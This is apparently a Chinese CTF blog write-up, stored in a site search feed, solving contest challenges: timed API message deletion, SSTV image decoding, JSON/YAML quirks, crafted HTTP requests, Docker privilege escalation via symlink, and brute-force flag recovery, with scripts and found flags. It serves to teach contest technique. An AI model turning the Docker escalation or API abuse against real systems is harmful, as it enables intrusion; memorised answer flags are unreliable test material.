&quot;session=eyJ0b2tlbiI6IjQ1MzpNRVVDSUJ3ZE1jd1RURkR2RlZwSGFRcXE0Tm94bzBSdnVGRDZzdExFNTJHOU42NlNBaUVBOEdXWGRXY1orN2pIeXFneUxxQTIyWDZDc2RoY3ZLblVPNjNjemFLMy8xUT0ifQ.ZTz5oQ.59uj_HyyOdElcS6oMKyqOq2koDo&quot;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"># 获取消息</span><br><span class="line">def get_messages():</span><br><span class="line">    response = requests.post(f&quot;&#123;BASE_URL&#125;/api/getMessages&quot;, headers=HEADERS)</span><br><span class="line">    if response.status_code == 200:</span><br><span class="line">        return response.json()</span><br><span class="line">    return []</span><br><span class="line"></span><br><span class="line"># 删除消息</span><br><span class="line">def delete_message(message_id):</span><br><span class="line">    payload = &#123;&quot;id&quot;: message_id&#125;</span><br><span class="line">    response = requests.post(f&quot;&#123;BASE_URL&#125;/api/deleteMessage&quot;, headers=HEADERS, json=payload)</span><br><span class="line">    if response.status_code == 200:</span><br><span class="line">        print(&quot;delete message: &quot;,message_id,&#x27; &#x27;, response.text,&#x27;\n&#x27;)</span><br><span class="line"></span><br><span class="line">def get_flag():</span><br><span class="line">    response = requests.post(f&quot;&#123;BASE_URL&#125;/api/getflag&quot;, headers=HEADERS)</span><br><span class="line">    if response.status_code == 200:</span><br><span class="line">        return response.text</span><br><span class="line">    return None</span><br><span class="line"># 主执行逻辑</span><br><span class="line">start_time = time.time()</span><br><span class="line">messages = get_messages()</span><br><span class="line">print(messages)</span><br><span class="line">i = 0 </span><br><span class="line">lastmessage = &#x27;&#x27;</span><br><span class="line">for message in messages[&#x27;messages&#x27;]:</span><br><span class="line">    match = re.search(r&#x27;hack\[[a-z]+\]&#x27;, message[&#x27;text&#x27;])</span><br><span class="line">    </span><br><span class="line">    if match:</span><br><span class="line">        while(1):</span><br><span class="line">            # print(i)</span><br><span class="line">            end_time = time.time()</span><br><span class="line">            if end_time - start_time &gt; message[&#x27;delay&#x27;] :</span><br><span class="line">                delete_message(i)  # 这里假设每个消息还有一个&#x27;id&#x27;字段。如果没有，你需要根据实际情况进行调整。</span><br><span class="line">                break</span><br><span class="line">    print(&#x27; &#x27;,message,&#x27;\n&#x27;)</span><br><span class="line">    i = i + 1</span><br><span class="line">    lastmessage=message</span><br><span class="line">time.sleep(7)</span><br><span class="line">flag = get_flag()</span><br><span class="line">print(&quot;Received flag:&quot;, flag)</span><br></pre></td></tr></table></figure><p>这里有个坑是发送时间不能在 delay 的时间之前发送，会显示<strong>时空错误</strong>，另外完成后要等待 7 秒左右再连接 getflag 接口，否则还是告诉你出错。</p><h2 id="虫"><a class="markdownIt-Anchor" href="#虫">#</a> <strong>虫</strong></h2><p>这道题要根据文字提示，告诉你这种方式可以接受 ISS 的图片，之后上网搜索，得值通过 SSTV 的方式获取 ISS 定时发送的图片。下载音频后下载相关的软件即可，这里由于声音较为刺耳，下载了虚拟音频驱动来播放（怕被室友打），第一次费好大劲下的 MMSSTV 还用不了，我还以为思路错了，之后用 RXSSTV 即可成功获取 flag。</p><h2 id="json-属于-yaml"><a class="markdownIt-Anchor" href="#json-属于-yaml">#</a> <strong>JSON 属于 YAML？</strong></h2><p>搜索即可</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag1: &#123;&#x27;value&#x27;:1e233&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag2: &#123;&#x27;va&#x27;:1,&#x27;va&#x27;:2&#125;</span><br></pre></td></tr></table></figure><h2 id="http集邮册"><a class="markdownIt-Anchor" href="#http集邮册">#</a> <strong>HTTP 集邮册</strong></h2><p>获取状态吗：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GET /file HTTP/1.1\r\n</span><br><span class="line">Host: www.example.com\r\n</span><br><span class="line">Range: bytes=5000-10000\r\n\r\n</span><br><span class="line"></span><br><span class="line">416 Requested Range Not Satisfiable</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GET / HTTP/1.1\r\n</span><br><span class="line">Host: www.example.com\r\n</span><br><span class="line">Range: bytes=0-999\r\n\r\n</span><br><span class="line"></span><br><span class="line">206 Partial Content</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GET /index.html HTTP/1.1</span><br><span class="line">Host</span><br><span class="line"></span><br><span class="line">400 Bad Request</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /index.html HTTP/1.1\r\n</span><br><span class="line">Host: www.example.com\r\n\r\n</span><br><span class="line"></span><br><span class="line">405 Not Allowed</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GET /index.html HTTP/1.1\r\n</span><br><span class="line">Host: www.example.com\r\n</span><br><span class="line">Content-Length: 10000000\r\n</span><br><span class="line">\r\n</span><br><span class="line">&#123;appl&#125;</span><br><span class="line"></span><br><span class="line">413 Request Entity Too Large</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GET /index.html HTTP/1.1\r\n</span><br><span class="line">Host: www.example.com\r\n</span><br><span class="line">EXPECT: 100-continue\r\n</span><br><span class="line">\r\n</span><br><span class="line"></span><br><span class="line">100 Continue</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GET /verylongpath/...[repeat many times]... HTTP/1.1\r\n</span><br><span class="line">Host: www.example.com\r\n\r\n</span><br><span class="line"></span><br><span class="line">414 URI Too Long </span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GET / HTTP/2.1\r\n</span><br><span class="line">Host: www.example.com\r\n\r\n</span><br><span class="line"></span><br><span class="line">505 HTTP Version Not Supported</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GET / HTTP/1.1\r\n</span><br><span class="line">Host: www.example.com\r\n\r\n</span><br><span class="line"></span><br><span class="line">200 OK</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GET /thispagedoesnotexist HTTP/1.1\r\n</span><br><span class="line">Host: www.baidu.com\r\n\r\n</span><br><span class="line"></span><br><span class="line">404 Not Found</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GET / HTTP/1.1\r\n</span><br><span class="line">Host: www.example.com\r\n</span><br><span class="line">If-Modified-Since: Tue, 15 Aug 2023 17:03:04 GMT\r\n\r\n</span><br><span class="line"></span><br><span class="line">304 Not Modified</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GET / HTTP/1.1\r\n</span><br><span class="line">Host: www.example.com\r\n</span><br><span class="line">If-Match: 121\r\n\r\n</span><br><span class="line"></span><br><span class="line">412 Precondition Failed</span><br></pre></td></tr></table></figure><h2 id="docker-for-everyone"><a class="markdownIt-Anchor" href="#docker-for-everyone">#</a> <strong>Docker for Everyone</strong></h2><p>题目给出了提示，通过 docker 提权即可，再启动 docker 时 -------- 之后 cat 软连接即可</p><h2 id="惜字如金"><a class="markdownIt-Anchor" href="#惜字如金">#</a> <strong>惜字如金</strong></h2><p>需要写脚本暴力，代码给出提示，</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">check_equals(set(len(s) for s in code_dict), &#123;24&#125;)</span><br></pre></td></tr></table></figure><p>每个有 24 个字符，而上面经过惜字如金处理之后为 23 个，故暴力出所有可能即可。</p><p>上代码：（写的不好，这里纯纯自己手打获取的所有可能</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">my_str = &#x27;nymeh1niwemflcir&#125;echaet&#x27;</span><br><span class="line">index = 0</span><br><span class="line">strs1 = []</span><br><span class="line">vowels = set(&quot;AEIOUaeiou&quot;)</span><br><span class="line"></span><br><span class="line">for s in my_str:</span><br><span class="line">    if s not in vowels:</span><br><span class="line">        new_str = my_str[:index] + s + my_str[index:]</span><br><span class="line">        strs1.append(new_str)</span><br><span class="line">    index += 1</span><br><span class="line"></span><br><span class="line"># for str1 in strs1:</span><br><span class="line">#     print(str1)</span><br><span class="line">strs1.append(&#x27;nymeh1niwemflcir&#125;echaete&#x27;)</span><br><span class="line">print(strs1)</span><br><span class="line"></span><br><span class="line">my_str2 = &#x27;a3g7&#125;kidgojernoetlsup?h&#x27;</span><br><span class="line">index = 0</span><br><span class="line">strs2 = []</span><br><span class="line">vowels = set(&quot;AEIOUaeiou&quot;)</span><br><span class="line"></span><br><span class="line">for s in my_str2:</span><br><span class="line">    if s not in vowels:</span><br><span class="line">        new_str = my_str2[:index] + s + my_str2[index:]</span><br><span class="line">        strs2.append(new_str)</span><br><span class="line">    index += 1</span><br><span class="line"></span><br><span class="line"># for str1 in strs1:</span><br><span class="line">#     print(str1)</span><br><span class="line">strs2.append(&#x27;a3g7&#125;kidgojernoetlsup?he&#x27;)</span><br><span class="line">strs2.append(&#x27;a3g7&#125;kidgojernoetlsupe?h&#x27;)</span><br><span class="line">print(strs2)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">my_str3 = &#x27;ulw!f5soadrhwnrsnstnoeq&#x27;</span><br><span class="line">index = 0</span><br><span class="line">strs3 = []</span><br><span class="line">vowels = set(&quot;AEIOUaeiou&quot;)</span><br><span class="line"></span><br><span class="line">for s in my_str3:</span><br><span class="line">    if s not in vowels:</span><br><span class="line">        new_str = my_str3[:index] + s + my_str3[index:]</span><br><span class="line">        strs3.append(new_str)</span><br><span class="line">    index += 1</span><br><span class="line"></span><br><span class="line"># for str1 in strs1:</span><br><span class="line">#     print(str1)</span><br><span class="line">strs3.append(&#x27;ulwe!f5soadrhwnrsnstnoeq&#x27;)</span><br><span class="line">strs3.append(&#x27;ulw!f5soadrhwnrsnstnoeqe&#x27;)</span><br><span class="line">print(strs3)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">my_str4 = &#x27;ct&#123;l-findiehaai&#123;oveatas&#x27;</span><br><span class="line">index = 0</span><br><span class="line">strs4 = []</span><br><span class="line">vowels = set(&quot;AEIOUaeiou&quot;)</span><br><span class="line"></span><br><span class="line">for s in my_str4:</span><br><span class="line">    if s not in vowels:</span><br><span class="line">        new_str = my_str4[:index] + s + my_str4[index:]</span><br><span class="line">        strs4.append(new_str)</span><br><span class="line">    index += 1</span><br><span class="line"></span><br><span class="line"># for str1 in strs1:</span><br><span class="line">#     print(str1)</span><br><span class="line">strs4.append(&#x27;cte&#123;l-findiehaai&#123;oveatas&#x27;)</span><br><span class="line">strs4.append(&#x27;ct&#123;le-findiehaai&#123;oveatas&#x27;)</span><br><span class="line">strs4.append(&#x27;ct&#123;l-findiehaai&#123;oveatase&#x27;)</span><br><span class="line">print(strs4)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">my_str5 = &#x27;ty9kxborszstguyd?!blm-p&#x27;</span><br><span class="line">index = 0</span><br><span class="line">strs5 = []</span><br><span class="line">vowels = set(&quot;AEIOUaeiou&quot;)</span><br><span class="line"></span><br><span class="line">for s in my_str5:</span><br><span class="line">    if s not in vowels:</span><br><span class="line">        new_str = my_str5[:index] + s + my_str5[index:]</span><br><span class="line">        strs5.append(new_str)</span><br><span class="line">    index += 1</span><br><span class="line"></span><br><span class="line"># for str1 in strs1:</span><br><span class="line">#     print(str1)</span><br><span class="line">strs5.append(&#x27;tye9kxborszstguyd?!blm-p&#x27;)</span><br><span class="line">strs5.append(&#x27;ty9kxborszstguyde?!blm-p&#x27;)</span><br><span class="line">strs5.append(&#x27;ty9kxborszstguyd?!blme-p&#x27;)</span><br><span class="line">strs5.append(&#x27;ty9kxborszstguyd?!blm-pe&#x27;)</span><br><span class="line">print(strs5)</span><br><span class="line">print(len(strs5))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>暴力即可</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#!/usr/bin/python3</span><br><span class="line"></span><br><span class="line"># Th siz of th fil may reduc after XZRJification</span><br><span class="line"></span><br><span class="line">def check_equals(flag,left, right):</span><br><span class="line">    # check whether left == right or not</span><br><span class="line">    if left == right: print(flag)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def decrypt_data(input_codes):</span><br><span class="line">    # retriev th decrypted data</span><br><span class="line"></span><br><span class="line">    output_chars = [cod_dict[c] for c in input_codes]</span><br><span class="line">    return &#x27;&#x27;.join(output_chars)</span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    # check som obvious things</span><br><span class="line">    # check th flag</span><br><span class="line">    flags = []</span><br><span class="line">    for i in range(len(strs1)):</span><br><span class="line">        for j in range(len(strs2)):</span><br><span class="line">            for k in range(len(strs3)):</span><br><span class="line">                for d in range(len(strs4)):</span><br><span class="line">                    for m in range(len(strs5)):</span><br><span class="line">                        cod_dict = []</span><br><span class="line">                        cod_dict += strs1[i]</span><br><span class="line">                        cod_dict += strs2[j]</span><br><span class="line">                        cod_dict += strs3[k]</span><br><span class="line">                        cod_dict += strs4[d]</span><br><span class="line">                        cod_dict += strs5[m] </span><br><span class="line">                        tttttt = [53, 41, 85, 109, 75, 1, 33, 48, 77, 90,</span><br><span class="line">                                            17, 118, 36, 25, 13, 89, 90, 3, 63, 25,</span><br><span class="line">                                            31, 77, 27, 60, 3, 118, 24, 62, 54, 61,</span><br><span class="line">                                            25, 63, 77, 36, 5, 32, 60, 67, 113, 28]</span><br><span class="line">                        </span><br><span class="line">                        output_chars = [cod_dict[c] for c in tttttt]</span><br><span class="line">                        flag = &#x27;&#x27;.join(output_chars)</span><br><span class="line">                        </span><br><span class="line">                        if flag not in flags:</span><br><span class="line">                            if &#x27;flag&#123;&#x27; in flag and &#x27;&#125;&#x27; in flag:</span><br><span class="line">                                check_equals(flag,flag.index(&#x27;flag&#123;&#x27;), 0)</span><br><span class="line">                                check_equals(flag,flag.index(&#x27;&#125;&#x27;), len(flag) - 1)</span><br><span class="line">                                flags.append(flag)</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;nou-v&#125;-r3lovmr3d-7hm-an5w3r-rhght?&#125;</span><br><span class="line">flag&#123;you-v&#125;-r3lovmr3d-7hm-an5w3r-rhght?&#125;</span><br><span class="line">flag&#123;you-v&#125;-r3lover3d-7he-an5w3r-rhght?&#125;</span><br><span class="line">flag&#123;you-v&#125;-r3lover3d-7he-an5w3r-r1ght?&#125;</span><br><span class="line">flag&#123;you-v&#125;-r3cover3d-7he-an5w3r-r1ght?&#125;</span><br><span class="line">flag&#123;you-ve-r3cover3d-7he-an5w3r-r1ght?&#125;</span><br><span class="line">flag&#123;you-ve-r3cover3d-7he-an5w3r-r1ght?&#125;</span><br></pre></td></tr></table></figure><p>这里调后面的即可</p><h2 id="高频率星球"><a class="markdownIt-Anchor" href="#高频率星球">#</a> <strong>高频率星球</strong></h2><p>我还专门下载了 asciinema（只能再 linux 上使用），这题主要是解码 json 再删去记录的相应的操作字符即可，直接 python 提取 json 内容再转到 notepad++ 上替换操作字符串。</p><p>另外 windows 直接改后缀无法打开（菜我不知道为什么，还以为自己没替换好），必须在 linux 下 Node flag.js 才可。</p><h2 id="流式星球"><a class="markdownIt-Anchor" href="#流式星球">#</a> <strong>流式星球</strong></h2><p>这题先跟着视频如何转换为字节流的代码反向写一个字节流转换为视频的代码</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import cv2</span><br><span class="line">import numpy as np</span><br><span class="line"></span><br><span class="line">def bin_to_video(bin_file, output_video, frame_width=1280, frame_height=640):</span><br><span class="line">   </span><br><span class="line">    buffer = np.fromfile(bin_file, dtype=np.uint8)</span><br><span class="line"></span><br><span class="line">   </span><br><span class="line">    frame_count = len(buffer) // (frame_width * frame_height * 3)</span><br><span class="line"></span><br><span class="line">    reshaped_buffer = buffer[:frame_count * frame_width * frame_height * 3]</span><br><span class="line">    reshaped_buffer = reshaped_buffer.reshape((frame_count, frame_height, frame_width, 3))</span><br><span class="line"></span><br><span class="line">    fourcc = cv2.VideoWriter_fourcc(*&#x27;mp4v&#x27;)</span><br><span class="line">    out = cv2.VideoWriter(output_video, fourcc, 30.0, (frame_width, frame_height))</span><br><span class="line"></span><br><span class="line">    for i in range(frame_count):</span><br><span class="line">        out.write(reshaped_buffer[i])</span><br><span class="line"></span><br><span class="line">    out.release()</span><br><span class="line"></span><br><span class="line">if __name__ == &quot;__main__&quot;:</span><br><span class="line">    bin_to_video(&quot;video.bin&quot;, &quot;deo.mp4&quot;)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>发现能模糊的看到 BangDream 几个字，之后去 B 站搜索了下，并找到相应的原视频（原视频为 360*640，改了一下 frame_width 和 frame_height，发现视频更加模糊），自己用题目给出的转化代码转换原视频，再自己手动测试，发现规律，在 frame_width 正确的情况下，frame_height 如何改变，视频只会出详上下移动的效果，而 frame_width 错误则视频极有可能十分模糊。直接上暴力，暴力 frame_width 直到找到正确的答案。似乎是 346. 之后就能得到清晰的视频</p><h2 id="异星歧途"><a class="markdownIt-Anchor" href="#异星歧途">#</a> <strong>异星歧途</strong></h2><p>主要是了解游戏机制，观看游戏里逻辑控制器的指令。第一个二进制序列很简单，照着打就行。<br><img src="https://github.com/dagzi1231/imagestorage/blob/img/img/2.png?raw=true" alt="图片"><br>第二个指令需要进行运算，指令给出 sw1-8 组成了 number,number == fl0 时能够运行，fl0 只能为数的平方，且 SW1 = SW6 = 1，直接一步步试一下就行。 第三个指令序列需要看游戏机制，在满足反应堆冷却液充足的情况下打开传送带开关即可。第四个指令序列也要了解游戏机制中焚化炉的作用，合理关闭烧毁发电材料的焚化炉即可。（此游戏让我想到了异星工厂，另一款非常好的传送带工厂游戏）</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Misc </tag>
            
            <tag> Web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hello World</title>
      <link href="/2023/11/10/hello-world/"/>
      <url>/2023/11/10/hello-world/</url>
      
        <content type="html"><![CDATA[<p>This is the start!</p>]]></content>
      
      
      
    </entry>
    
    
  
  
</search>
